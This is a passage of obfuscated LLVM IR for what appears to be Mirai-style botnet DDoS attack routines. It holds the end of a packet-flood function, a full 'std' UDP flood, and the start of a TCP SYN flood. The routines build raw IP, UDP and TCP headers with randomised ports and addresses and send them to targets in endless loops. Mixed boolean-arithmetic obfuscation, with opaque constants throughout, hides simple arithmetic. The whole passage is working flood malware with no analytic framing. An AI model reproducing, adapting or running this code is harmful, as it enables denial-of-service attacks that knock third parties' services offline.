  %422 = and i32 %421, -2147406436
  %423 = and i32 -1, %419
  %424 = or i32 %418, %420
  %425 = or i32 %422, %423
  %426 = xor i32 %424, %425
  %427 = xor i32 %415, -1
  %428 = trunc i32 %426 to i16
  %429 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %430 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %429, i32 0, i32 3
  store i16 %428, i16* %430, align 4
  br label %431

; <label>:431:                                    ; preds = %396, %392
  %432 = load i16, i16* %16, align 2
  %433 = zext i16 %432 to i32
  %434 = icmp eq i32 %433, 65535
  br i1 %434, label %435, label %444

; <label>:435:                                    ; preds = %431
  %436 = call i32 @rand_next()
  %437 = xor i32 65535, -1
  %438 = xor i32 %436, %437
  %439 = and i32 %438, %436
  %440 = and i32 %436, 65535
  %441 = trunc i32 %439 to i16
  %442 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %443 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %442, i32 0, i32 0
  store i16 %441, i16* %443, align 2
  br label %444

; <label>:444:                                    ; preds = %435, %431
  %445 = load i16, i16* %17, align 2
  %446 = zext i16 %445 to i32
  %447 = icmp eq i32 %446, 65535
  br i1 %447, label %448, label %457

; <label>:448:                                    ; preds = %444
  %449 = call i32 @rand_next()
  %450 = xor i32 65535, -1
  %451 = xor i32 %449, %450
  %452 = and i32 %451, %449
  %453 = and i32 %449, 65535
  %454 = trunc i32 %452 to i16
  %455 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %456 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %455, i32 0, i32 1
  store i16 %454, i16* %456, align 2
  br label %457

; <label>:457:                                    ; preds = %448, %444
  %458 = load i8, i8* %20, align 1
  %459 = icmp ne i8 %458, 0
  br i1 %459, label %464, label %460

; <label>:460:                                    ; preds = %457
  %461 = call i32 @rand_next()
  %462 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %463 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %462, i32 0, i32 9
  store i32 %461, i32* %463, align 4
  br label %470

; <label>:464:                                    ; preds = %457
  %465 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %466 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %465, i32 0, i32 9
  %467 = load i32, i32* %466, align 4
  %468 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %469 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %468, i32 0, i32 9
  store i32 %467, i32* %469, align 4
  br label %470

; <label>:470:                                    ; preds = %464, %460
  %471 = call i32 @rand_next()
  store i32 %471, i32* %37, align 4
  %472 = call i32 @rand_next()
  store i32 %472, i32* %38, align 4
  %473 = call i32 @rand_next()
  store i32 %473, i32* %39, align 4
  %474 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %475 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %474, i32 0, i32 0
  %476 = getelementptr inbounds [6 x i8], [6 x i8]* %475, i32 0, i32 0
  %477 = bitcast i32* %37 to i8*
  call void @util_memcpy(i8* %476, i8* %477, i32 4)
  %478 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %479 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %478, i32 0, i32 1
  %480 = getelementptr inbounds [6 x i8], [6 x i8]* %479, i32 0, i32 0
  %481 = bitcast i32* %38 to i8*
  call void @util_memcpy(i8* %480, i8* %481, i32 4)
  %482 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %483 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %482, i32 0, i32 0
  %484 = getelementptr inbounds [6 x i8], [6 x i8]* %483, i32 0, i32 0
  %485 = getelementptr inbounds i8, i8* %484, i64 4
  %486 = bitcast i32* %39 to i8*
  call void @util_memcpy(i8* %485, i8* %486, i32 2)
  %487 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %488 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %487, i32 0, i32 1
  %489 = getelementptr inbounds [6 x i8], [6 x i8]* %488, i32 0, i32 0
  %490 = getelementptr inbounds i8, i8* %489, i64 4
  %491 = bitcast i32* %39 to i8*
  %492 = getelementptr inbounds i8, i8* %491, i64 2
  call void @util_memcpy(i8* %490, i8* %492, i32 2)
  %493 = load i8, i8* %19, align 1
  %494 = icmp ne i8 %493, 0
  br i1 %494, label %495, label %498

; <label>:495:                                    ; preds = %470
  %496 = load i8*, i8** %36, align 8
  %497 = load i32, i32* %18, align 4
  call void @rand_str(i8* %496, i32 %497)
  br label %498

; <label>:498:                                    ; preds = %495, %470
  %499 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %500 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %499, i32 0, i32 7
  store i16 0, i16* %500, align 2
  %501 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %502 = bitcast %struct.iphdr* %501 to i16*
  %503 = call zeroext i16 @checksum_generic(i16* %502, i32 20)
  %504 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %505 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %504, i32 0, i32 7
  store i16 %503, i16* %505, align 2
  %506 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %507 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %506, i32 0, i32 7
  store i16 0, i16* %507, align 2
  %508 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %509 = bitcast %struct.iphdr* %508 to i16*
  %510 = call zeroext i16 @checksum_generic(i16* %509, i32 20)
  %511 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %512 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %511, i32 0, i32 7
  store i16 %510, i16* %512, align 2
  %513 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %514 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %513, i32 0, i32 3
  store i16 0, i16* %514, align 2
  %515 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %516 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %517 = bitcast %struct.udphdr* %516 to i8*
  %518 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %519 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %518, i32 0, i32 2
  %520 = load i16, i16* %519, align 2
  %521 = load i32, i32* %18, align 4
  %522 = sext i32 %521 to i64
  %523 = sub i64 8, 7395864475079797123
  %524 = add i64 %523, %522
  %525 = add i64 %524, 7395864475079797123
  %526 = add i64 8, %522
  %527 = trunc i64 %525 to i32
  %528 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %515, i8* %517, i16 zeroext %520, i32 %527)
  %529 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %530 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %529, i32 0, i32 3
  store i16 %528, i16* %530, align 2
  %531 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %532 = load i32, i32* %9, align 4
  %533 = sext i32 %532 to i64
  %534 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %531, i64 %533
  %535 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %534, i32 0, i32 0
  %536 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %535, i32 0, i32 0
  store i16 2, i16* %536, align 4
  %537 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %538 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %537, i32 0, i32 9
  %539 = load i32, i32* %538, align 4
  %540 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %541 = load i32, i32* %9, align 4
  %542 = sext i32 %541 to i64
  %543 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %540, i64 %542
  %544 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %543, i32 0, i32 0
  %545 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %544, i32 0, i32 2
  %546 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %545, i32 0, i32 0
  store i32 %539, i32* %546, align 4
  %547 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %548 = load i32, i32* %9, align 4
  %549 = sext i32 %548 to i64
  %550 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %547, i64 %549
  %551 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %550, i32 0, i32 0
  %552 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %551, i32 0, i32 1
  store i16 0, i16* %552, align 2
  %553 = load i32, i32* %10, align 4
  %554 = load i8*, i8** %30, align 8
  %555 = load i32, i32* %18, align 4
  %556 = sext i32 %555 to i64
  %557 = sub i64 66, 8701946995932970401
  %558 = add i64 %557, %556
  %559 = add i64 %558, 8701946995932970401
  %560 = add i64 66, %556
  %561 = bitcast %union.__CONST_SOCKADDR_ARG* %40 to %struct.sockaddr**
  %562 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %563 = load i32, i32* %9, align 4
  %564 = sext i32 %563 to i64
  %565 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %562, i64 %564
  %566 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %565, i32 0, i32 0
  %567 = bitcast %struct.sockaddr_in* %566 to %struct.sockaddr*
  store %struct.sockaddr* %567, %struct.sockaddr** %561, align 8
  %568 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %40, i32 0, i32 0
  %569 = load %struct.sockaddr*, %struct.sockaddr** %568, align 8
  %570 = call i64 @sendto(i32 %553, i8* %554, i64 %559, i32 16384, %struct.sockaddr* %569, i32 16)
  br label %571

; <label>:571:                                    ; preds = %498
  %572 = load i32, i32* %9, align 4
  %573 = sub i32 0, 1
  %574 = sub i32 %572, %573
  %575 = add nsw i32 %572, 1
  store i32 %574, i32* %9, align 4
  br label %325

; <label>:576:                                    ; preds = %325
  br label %324

; <label>:577:                                    ; preds = %92, %86
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_std(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %23 = load i8, i8* %5, align 1
  %24 = zext i8 %23 to i64
  %25 = call noalias i8* @calloc(i64 %24, i64 8) #6
  %26 = bitcast i8* %25 to i8**
  store i8** %26, i8*** %10, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 4) #6
  %30 = bitcast i8* %29 to i32*
  store i32* %30, i32** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 7, i32 65535)
  %34 = trunc i32 %33 to i16
  store i16 %34, i16* %12, align 2
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 6, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 0, i32 1024)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %14, align 2
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 1, i32 1)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 16, i32 4, i1 false)
  %48 = load i16, i16* %13, align 2
  %49 = zext i16 %48 to i32
  %50 = icmp eq i32 %49, 65535
  br i1 %50, label %51, label %54

; <label>:51:                                     ; preds = %4
  %52 = call i32 @rand_next()
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %13, align 2
  br label %57

; <label>:54:                                     ; preds = %4
  %55 = load i16, i16* %13, align 2
  %56 = call zeroext i16 @htons(i16 zeroext %55) #7
  store i16 %56, i16* %13, align 2
  br label %57

; <label>:57:                                     ; preds = %54, %51
  store i32 0, i32* %9, align 4
  br label %58

; <label>:58:                                     ; preds = %174, %57
  %59 = load i32, i32* %9, align 4
  %60 = load i8, i8* %5, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp slt i32 %59, %61
  br i1 %62, label %63, label %180

; <label>:63:                                     ; preds = %58
  %64 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %65 = load i8**, i8*** %10, align 8
  %66 = load i32, i32* %9, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8*, i8** %65, i64 %67
  store i8* %64, i8** %68, align 8
  %69 = load i16, i16* %12, align 2
  %70 = zext i16 %69 to i32
  %71 = icmp eq i32 %70, 65535
  br i1 %71, label %72, label %81

; <label>:72:                                     ; preds = %63
  %73 = call i32 @rand_next()
  %74 = trunc i32 %73 to i16
  %75 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %76 = load i32, i32* %9, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %75, i64 %77
  %79 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %78, i32 0, i32 0
  %80 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %79, i32 0, i32 1
  store i16 %74, i16* %80, align 2
  br label %90

; <label>:81:                                     ; preds = %63
  %82 = load i16, i16* %12, align 2
  %83 = call zeroext i16 @htons(i16 zeroext %82) #7
  %84 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %85 = load i32, i32* %9, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %84, i64 %86
  %88 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %87, i32 0, i32 0
  %89 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %88, i32 0, i32 1
  store i16 %83, i16* %89, align 2
  br label %90

; <label>:90:                                     ; preds = %81, %72
  %91 = call i32 @socket(i32 2, i32 2, i32 0) #6
  %92 = load i32*, i32** %11, align 8
  %93 = load i32, i32* %9, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i32, i32* %92, i64 %94
  store i32 %91, i32* %95, align 4
  %96 = icmp eq i32 %91, -1
  br i1 %96, label %97, label %98

; <label>:97:                                     ; preds = %90
  ret void

; <label>:98:                                     ; preds = %90
  %99 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %99, align 4
  %100 = load i16, i16* %13, align 2
  %101 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %100, i16* %101, align 2
  %102 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %103 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %102, i32 0, i32 0
  store i32 0, i32* %103, align 4
  %104 = load i32*, i32** %11, align 8
  %105 = load i32, i32* %9, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i32, i32* %104, i64 %106
  %108 = load i32, i32* %107, align 4
  %109 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %110 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %110, %struct.sockaddr** %109, align 8
  %111 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %112 = load %struct.sockaddr*, %struct.sockaddr** %111, align 8
  %113 = call i32 @bind(i32 %108, %struct.sockaddr* %112, i32 16) #6
  %114 = icmp eq i32 %113, -1
  br i1 %114, label %115, label %116

; <label>:115:                                    ; preds = %98
  br label %116

; <label>:116:                                    ; preds = %115, %98
  %117 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %118 = load i32, i32* %9, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %117, i64 %119
  %121 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %120, i32 0, i32 2
  %122 = load i8, i8* %121, align 4
  %123 = zext i8 %122 to i32
  %124 = icmp slt i32 %123, 32
  br i1 %124, label %125, label %155

; <label>:125:                                    ; preds = %116
  %126 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %127 = load i32, i32* %9, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %126, i64 %128
  %130 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %129, i32 0, i32 1
  %131 = load i32, i32* %130, align 4
  %132 = call i32 @ntohl(i32 %131) #7
  %133 = call i32 @rand_next()
  %134 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %135 = load i32, i32* %9, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %134, i64 %136
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %137, i32 0, i32 2
  %139 = load i8, i8* %138, align 4
  %140 = zext i8 %139 to i32
  %141 = lshr i32 %133, %140
  %142 = sub i32 0, %132
  %143 = sub i32 0, %141
  %144 = add i32 %142, %143
  %145 = sub i32 0, %144
  %146 = add i32 %132, %141
  %147 = call i32 @htonl(i32 %145) #7
  %148 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %149 = load i32, i32* %9, align 4
  %150 = sext i32 %149 to i64
  %151 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %148, i64 %150
  %152 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %151, i32 0, i32 0
  %153 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %152, i32 0, i32 2
  %154 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %153, i32 0, i32 0
  store i32 %147, i32* %154, align 4
  br label %155

; <label>:155:                                    ; preds = %125, %116
  %156 = load i32*, i32** %11, align 8
  %157 = load i32, i32* %9, align 4
  %158 = sext i32 %157 to i64
  %159 = getelementptr inbounds i32, i32* %156, i64 %158
  %160 = load i32, i32* %159, align 4
  %161 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %162 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %163 = load i32, i32* %9, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %162, i64 %164
  %166 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %165, i32 0, i32 0
  %167 = bitcast %struct.sockaddr_in* %166 to %struct.sockaddr*
  store %struct.sockaddr* %167, %struct.sockaddr** %161, align 8
  %168 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %169 = load %struct.sockaddr*, %struct.sockaddr** %168, align 8
  %170 = call i32 @connect(i32 %160, %struct.sockaddr* %169, i32 16)
  %171 = icmp eq i32 %170, -1
  br i1 %171, label %172, label %173

; <label>:172:                                    ; preds = %155
  br label %173

; <label>:173:                                    ; preds = %172, %155
  br label %174

; <label>:174:                                    ; preds = %173
  %175 = load i32, i32* %9, align 4
  %176 = sub i32 %175, -1223456263
  %177 = add i32 %176, 1
  %178 = add i32 %177, -1223456263
  %179 = add nsw i32 %175, 1
  store i32 %178, i32* %9, align 4
  br label %58

; <label>:180:                                    ; preds = %58
  br label %181

; <label>:181:                                    ; preds = %214, %180
  store i32 0, i32* %9, align 4
  br label %182

; <label>:182:                                    ; preds = %209, %181
  %183 = load i32, i32* %9, align 4
  %184 = load i8, i8* %5, align 1
  %185 = zext i8 %184 to i32
  %186 = icmp slt i32 %183, %185
  br i1 %186, label %187, label %214

; <label>:187:                                    ; preds = %182
  %188 = load i8**, i8*** %10, align 8
  %189 = load i32, i32* %9, align 4
  %190 = sext i32 %189 to i64
  %191 = getelementptr inbounds i8*, i8** %188, i64 %190
  %192 = load i8*, i8** %191, align 8
  store i8* %192, i8** %22, align 8
  %193 = load i8, i8* %15, align 1
  %194 = icmp ne i8 %193, 0
  br i1 %194, label %195, label %199

; <label>:195:                                    ; preds = %187
  %196 = load i8*, i8** %22, align 8
  %197 = load i16, i16* %14, align 2
  %198 = zext i16 %197 to i32
  call void @rand_str(i8* %196, i32 %198)
  br label %199

; <label>:199:                                    ; preds = %195, %187
  %200 = load i32*, i32** %11, align 8
  %201 = load i32, i32* %9, align 4
  %202 = sext i32 %201 to i64
  %203 = getelementptr inbounds i32, i32* %200, i64 %202
  %204 = load i32, i32* %203, align 4
  %205 = load i8*, i8** %22, align 8
  %206 = load i16, i16* %14, align 2
  %207 = zext i16 %206 to i64
  %208 = call i64 @send(i32 %204, i8* %205, i64 %207, i32 16384)
  br label %209

; <label>:209:                                    ; preds = %199
  %210 = load i32, i32* %9, align 4
  %211 = sub i32 0, 1
  %212 = sub i32 %210, %211
  %213 = add nsw i32 %210, 1
  store i32 %212, i32* %9, align 4
  br label %182

; <label>:214:                                    ; preds = %182
  br label %181
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #1

declare i32 @connect(i32, %struct.sockaddr*, i32) #4

declare i64 @send(i32, i8*, i64, i32) #4

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpsyn(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.tcphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.tcphdr*, align 8
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %34 = load i8, i8* %5, align 1
  %35 = zext i8 %34 to i64
  %36 = call noalias i8* @calloc(i64 %35, i64 8) #6
  %37 = bitcast i8* %36 to i8**
  store i8** %37, i8*** %11, align 8
  %38 = load i8, i8* %7, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 2, i32 0)
  %41 = trunc i32 %40 to i8
  store i8 %41, i8* %12, align 1
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 3, i32 65535)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %13, align 2
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 4, i32 64)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %14, align 1
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 5, i32 1)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %15, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 6, i32 65535)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %16, align 2
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 7, i32 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %17, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 17, i32 65535)
  store i32 %64, i32* %18, align 4
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 18, i32 0)
  store i32 %67, i32* %19, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 11, i32 0)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 12, i32 0)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %21, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 13, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %22, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 14, i32 0)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %23, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 15, i32 1)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %24, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 16, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %25, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = load i32, i32* @LOCAL_ADDR, align 4
  %95 = call i32 @attack_get_opt_ip(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 25, i32 %94)
  store i32 %95, i32* %26, align 4
  %96 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %96, i32* %10, align 4
  %97 = icmp eq i32 %96, -1
  br i1 %97, label %98, label %99

; <label>:98:                                     ; preds = %4
  br label %661

; <label>:99:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %100 = load i32, i32* %10, align 4
  %101 = bitcast i32* %9 to i8*
  %102 = call i32 @setsockopt(i32 %100, i32 0, i32 3, i8* %101, i32 4) #6
  %103 = icmp eq i32 %102, -1
  br i1 %103, label %104, label %107

; <label>:104:                                    ; preds = %99
  %105 = load i32, i32* %10, align 4
  %106 = call i32 @close(i32 %105)
  br label %661

; <label>:107:                                    ; preds = %99
  store i32 0, i32* %9, align 4
  br label %108

; <label>:108:                                    ; preds = %483, %107
  %109 = load i32, i32* %9, align 4
  %110 = load i8, i8* %5, align 1
  %111 = zext i8 %110 to i32
  %112 = icmp slt i32 %109, %111
  br i1 %112, label %113, label %489

; <label>:113:                                    ; preds = %108
  %114 = call noalias i8* @calloc(i64 128, i64 1) #6
  %115 = load i8**, i8*** %11, align 8
  %116 = load i32, i32* %9, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i8*, i8** %115, i64 %117
  store i8* %114, i8** %118, align 8
  %119 = load i8**, i8*** %11, align 8
  %120 = load i32, i32* %9, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8*, i8** %119, i64 %121
  %123 = load i8*, i8** %122, align 8
  %124 = bitcast i8* %123 to %struct.iphdr*
  store %struct.iphdr* %124, %struct.iphdr** %27, align 8
